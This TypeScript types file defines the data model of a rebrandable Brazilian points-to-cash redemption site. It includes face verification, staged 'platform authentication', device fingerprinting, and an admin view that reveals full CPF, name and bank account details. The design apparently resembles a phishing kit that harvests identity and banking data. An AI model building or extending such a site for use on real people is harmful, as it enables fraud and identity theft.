export interface ExchangeOption {
  id: string;
  title: string;
  description: string;
  rateLabel: string;
}

export interface RedemptionPageConfig {
  platformName: string;
  companyName: string;
  backgroundColor: string;
  title: string;
  subtitle: string;
  infoText: string;
  bankLabel: string;
  depositInstructions: string;
  showAgencyDigit: boolean;
  loadingTitle: string;
  loadingSubtitle: string;
  facialTitle: string;
  facialInstructions: string;
  facialButtonText: string;
  authButtonText: string;
  finalTitle: string;
  finalSubtitle: string;
  finalInfoText: string;
  convertButtonText: string;
  ownershipButtonText: string;
  requestButtonText: string;
  confirmButtonText: string;
  redemptionLogoUrl?: string | null;
}

export interface SiteSettings {
  brandName: string;
  brandLogoUrl: string | null;
  heroTitle: string;
  heroSubtitle: string;
  formHeading: string;
  pointsLabel: string;
  minPointsPreview: number;
  maxPointsPreview: number;
  exchangeOptions: ExchangeOption[];
  redemptionPage: RedemptionPageConfig;
  passcodeManagedByEnv?: boolean;
}

export type ConsultaStatus = 'consultado' | 'troca_solicitada';

export type FaceVerificationStatus = 'pendente' | 'verificada' | 'falha';

export type PlatformAuthStatus =
  | 'pendente'
  | 'etapa_a_concluida'
  | 'autenticado'
  | 'bloqueado';

export type RedemptionAdminStatus =
  | 'aguardando_analise'
  | 'identidade_verificada'
  | 'correcao_necessaria'
  | 'resgate_aprovado'
  | 'deposito_realizado'
  | 'resgate_recusado';

export interface AuditHistoryEntry {
  id: string;
  at: string;
  actor: 'participante' | 'sistema' | 'admin';
  action: string;
  details?: string;
}

export interface ConsultaPublicResult {
  id: string;
  protocol: string;
  profileLabel: string;
  cpfMasked: string;
  phoneMasked: string;
  referenceCode: string;
  pointsAvailable: number;
  amountBrl: number;
  status: ConsultaStatus;
  selectedOptionTitle: string | null;
  bankLabel: string | null;
  agencyMasked: string | null;
  accountMasked: string | null;
  ownershipConfirmed: boolean;
  faceVerificationStatus: FaceVerificationStatus;
  faceVerifiedAt: string | null;
  platformAuthStatus: PlatformAuthStatus;
  platformAuthCompletedAt: string | null;
  redemptionStatus: RedemptionAdminStatus;
  guaranteed24h: boolean;
  depositForecast: string;
  createdAt: string;
  exchangedAt: string | null;
  claimToken: string;
  alreadyRegistered?: boolean;
  livenessChallenge?: string;
  stepChallengeCode?: string;
}

export interface ConsultaAdminRecord {
  id: string;
  protocol: string;
  profileLabel: string;
  cpfHash?: string;
  cpfMasked: string;
  phoneMasked: string;
  cpf?: string;
  phone?: string;
  clientIp?: string;
  device?: string;
  deviceBrand?: string;
  deviceModel?: string;
  deviceType?: 'Celular' | 'Tablet' | 'Computador';
  os?: string;
  browser?: string;
  userAgent?: string;
  screen?: string;
  referenceCode: string;
  pointsAvailable: number;
  amountBrl: number;
  status: ConsultaStatus;
  selectedOptionId: string | null;
  selectedOptionTitle: string | null;
  bankLabel: string | null;
  agencyMasked: string | null;
  accountMasked: string | null;
  ownershipConfirmed: boolean;
  faceVerificationStatus: FaceVerificationStatus;
  faceVerifiedAt: string | null;
  platformAuthStatus: PlatformAuthStatus;
  platformAuthCompletedAt: string | null;
  redemptionStatus: RedemptionAdminStatus;
  guaranteed24h: boolean;
  depositForecast: string;
  hasEncryptedDetails?: boolean;
  auditHistory: AuditHistoryEntry[];
  createdAt: string;
  exchangedAt: string | null;
}

export interface RevealedDepositDetails {
  id: string;
  protocol: string;
  fullName: string;
  cpf: string;
  phone: string;
  bankLabel: string;
  agency: string;
  agencyDigit: string;
  accountNumber: string;
  accountDigit: string;
  revealedAt: string;
}
